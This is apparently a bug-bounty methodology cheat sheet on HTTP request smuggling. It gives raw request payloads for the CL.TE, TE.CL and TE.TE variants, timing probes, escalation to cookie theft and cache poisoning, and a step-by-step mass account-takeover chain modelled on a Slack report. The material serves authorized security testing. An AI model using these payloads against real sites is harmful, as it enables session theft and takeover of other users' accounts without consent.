# HTTP Request Smuggling — Slack mass ATO pattern

> H1: Slack mass ATO via smuggling on slackb.com (#737140); also LINE, Zomato, New Relic. Smuggling pays $5K-$30K consistently when impact is shown.

---

## CORE IDEA

Front-end + back-end disagree on where one request ends and the next begins. Inject extra HTTP request bytes that the back-end attributes to the *next* user's connection -> steal their cookies / get them to hit your endpoint.

---

## VARIANTS

### CL.TE
Front-end uses Content-Length, back-end uses Transfer-Encoding.
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL
Front-end Transfer-Encoding, back-end Content-Length.
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

8c
GPOST / HTTP/1.1
Host: target.com
Content-Length: 100

x=1
0


```

### TE.TE
Both honor Transfer-Encoding but front-end can be tricked into ignoring it via header obfuscation:
```
Transfer-Encoding: chunked
Transfer-encoding: x
Transfer-Encoding : chunked
Transfer-Encoding: chunked\r\n  chunked
Transfer-Encoding:[\x0b]chunked
```

### CL.0
Front-end uses Content-Length, back-end ignores body entirely on certain endpoints (like `/static/...`).

### H2.CL / H2.TE
HTTP/2 downgrade to HTTP/1.1 — front-end accepts HTTP/2, back-end is HTTP/1.1. Smuggle via `:method`/`:path` injection in HTTP/2 pseudo-headers.

### h2c upgrade
Cleartext HTTP/2 over plaintext HTTP. Some load balancers honor `Upgrade: h2c` and pipe the connection raw -> bypass authz on backend.

### Response queue desync (CL.0 / 0.CL)
Sneak extra response into queue so victim gets attacker's response.

---

## STAGE 1 — Detection

Use **Burp Repeater** with HTTP/1.1 + "Update Content-Length" disabled. Or use **smuggler.py** for automated probes.

Probes (timing-based):
```http
# CL.TE detect
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```
Back-end waits for `\r\n0\r\n\r\n` -> times out -> CL.TE present.

Tool: **smuggler** (defparam) — runs all permutations.

---

## STAGE 2 — Confirmation

Once timing differential is found, confirm with a benign smuggle:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404page HTTP/1.1
X: x
```

Then send a *normal* request to the same backend pool. If you get the 404 page (or other unexpected response), smuggle is confirmed.

---

## STAGE 3 — Impact escalation (the $10K gate)

### A. Bypass auth (if front-end enforces auth)
Smuggle a request that doesn't go through front-end auth path.

### B. Steal cookies / session via reflected response
Smuggle a request that the next user's request gets *prepended* to:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 200
Transfer-Encoding: chunked

0

GET /search?q= HTTP/1.1
X: 
```
Next user's request fills the `q=` param -> their cookies/headers reflected in response -> attacker reads from cache/log.

### C. Cache poisoning via smuggling
Smuggle a request that poisons a CDN cache entry with attacker-controlled response (Slack used this for ATO).

### D. CSRF without origin
Smuggle a state-changing request through victim's session as the next-on-the-wire.

---

## CHAIN RECIPE — Mass ATO via smuggling + cache (Slack)

1. Detect smuggling on `target.com` or sibling host
2. Smuggle a request to `/login` that returns attacker-controlled HTML
3. CDN caches this response keyed to a popular path
4. Victims hit the path, get attacker's HTML, JS steals cookies / forces login as attacker
5. Mass ATO

---

## VALIDATION CHECKLIST

- Always reproduce 2-3 times — smuggling is timing-sensitive
- Use a unique marker (random string) so you can prove smuggle vs noise
- Capture full HTTP/1.1 byte stream including \r\n
- Record front-end and back-end behavior separately if possible
- Note when CDN/cache is in path

---

## TOOLING

- **Burp Repeater** with HTTP/2 toggle + "don't update CL"
- **HTTP Request Smuggler** (Burp ext, James Kettle)
- **smuggler.py** (defparam)
- **h2csmuggler** (BishopFox)
- **Turbo Intruder** for racing smuggle attempts
